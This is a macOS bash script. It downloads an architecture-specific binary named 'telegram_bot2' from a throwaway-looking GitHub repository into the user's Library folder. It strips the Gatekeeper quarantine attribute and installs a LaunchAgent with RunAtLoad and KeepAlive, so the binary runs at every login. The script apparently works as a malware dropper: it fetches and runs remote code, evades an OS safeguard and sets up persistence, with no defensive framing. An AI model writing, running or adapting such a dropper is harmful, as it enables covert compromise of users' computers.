#!/bin/bash

# Define persistent target directories
INSTALL_DIR="$HOME/Library/Application Support/autotunagents"
LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
PLIST_NAME="com.user.autotunagent.plist"
BINARY_NAME="agent_binary"

# Create target directories if they don't exist
mkdir -p "$INSTALL_DIR"
mkdir -p "$LAUNCH_AGENTS_DIR"

# Detect CPU architecture
ARCH=$(uname -m)

if [ "$ARCH" = "arm64" ]; then
    echo "Detected Apple Silicon (ARM64)"
    URL="https://raw.githubusercontent.com/rustdev55/test123/main/ZIG_tears/aarch64-macos/telegram_bot2"
elif [ "$ARCH" = "x86_64" ]; then
    echo "Detected Intel (x86_64)"
    URL="https://raw.githubusercontent.com/rustdev55/test123/main/ZIG_tears/x86_64-macos/telegram_bot2"
else
    echo "Unsupported architecture: $ARCH"
    exit 1
fi

TARGET_PATH="$INSTALL_DIR/$BINARY_NAME"

# Download binary to the persistent Library folder
curl -L "$URL" -o "$TARGET_PATH"

# Set permissions and strip Gatekeeper quarantine
chmod +x "$TARGET_PATH"
xattr -cr "$TARGET_PATH"

# Create the LaunchAgent plist for persistence on every boot/login
PLIST_PATH="$LAUNCH_AGENTS_DIR/$PLIST_NAME"

cat << EOF > "$PLIST_PATH"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.autotunagent</string>
    <key>ProgramArguments</key>
    <array>
        <string>$TARGET_PATH</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

# Load the LaunchAgent immediately so it starts right now without rebooting
launchctl unload "$PLIST_PATH" 2>/dev/null
launchctl load "$PLIST_PATH"

echo "Installation and persistence setup complete!"
